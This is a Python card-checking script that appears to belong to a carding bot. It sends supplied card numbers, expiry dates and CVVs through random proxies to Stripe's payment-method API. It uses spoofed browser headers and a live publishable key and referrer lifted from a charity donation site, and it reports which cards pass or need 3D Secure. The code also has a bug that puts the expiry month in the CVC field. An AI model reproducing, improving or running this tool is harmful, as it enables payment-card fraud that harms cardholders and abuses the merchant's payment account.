from all.configs._def_main_ import *

async def naruto(cc, mes, ano, cvv):
    proxy_url = random.choice(proxies)

    conn = aiohttp_proxy.ProxyConnector.from_url(proxy_url)
    async with aiohttp.ClientSession(connector=conn) as session:

        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
}

        data = {
    'type': 'card',
    'billing_details[name]': 'joesj+jdbd',
    'card[number]': cc,
    'card[cvc]': mes,
    'card[exp_month]': mes,
    'card[exp_year]': ano,
    'guid': 'f86b00f6-f09a-4389-98be-a2b621e3048b0f77a1',
    'muid': '657f439b-f6a2-4a98-820d-6ed41745a96d2769b9',
    'sid': 'f72d56c3-44f5-40c8-82bf-1b6e0e188b90ea4f42',
    'pasted_fields': 'number',
    'payment_user_agent': 'stripe.js%2Fb06866a7a1%3B+stripe-js-v3%2Fb06866a7a1%3B+split-card-element',
    'referrer': 'https://pariyattiorg.giveforms.com',
    'time_on_page': '44709',
    'key': 'pk_live_2T8mSGhZyE3A8I2kToOFE1R9'
}
        
        async with session.post(f'https://api.stripe.com/v1/payment_methods', headers=headers, data=data) as resp2:
            req2 = await resp2.text()
            if "stripe_3ds2_fingerprint" in req2:
                mess = "3D"
            else:
                mess = req2
                print(f"{mess}")
            return mess
